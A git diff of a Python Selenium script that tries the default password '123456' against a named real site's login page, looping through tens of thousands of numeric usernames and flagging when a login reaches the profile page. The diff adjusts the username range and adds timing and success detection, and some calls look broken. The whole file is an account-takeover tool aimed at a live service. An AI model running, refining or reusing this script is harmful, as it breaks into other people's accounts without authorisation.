@@ -1,3 +1,4 @@
+import time
 import os
 import pandas as pd
 import numpy as np
@@ -6,12 +7,13 @@ from selenium.webdriver.common.keys import Keys
 
 driver = webdriver.Firefox()
 
-startNumber = 170900000
+startNumber = 180900000
 
 def startFun():
     driver.get("http://mypage.i-on.in/loginpage.aspx")
     if not "My Page" in driver.title:
         raise Exception("Unable to load ION page!")
+    print(driver.current_url)
 
     for i in range(5000, 60000, 1000):
         for j in range(0,300):
@@ -24,11 +26,15 @@ def startFun():
             a.send_keys("123456")
             submit = driver.find_element_by_id("btnSubmit")
             submit.click()
-            #strinuse = driver.current_url()
-            #if strinuse in "http:/i-on.in/Masters/MyProfile.aspx":
-                #print("Success")
-            driver.switchTo().alert().accept();
-            driver.refresh()
+            time.sleep(2)
+            success_string = driver.current_url
+            if success_string in "http:/i-on.in/Masters/MyProfile.aspx":
+                print("Success")
+                break
+            else:
+                time.sleep(3)
+                un.clear()
+                driver.navigate().refresh()
 startFun()
 
 
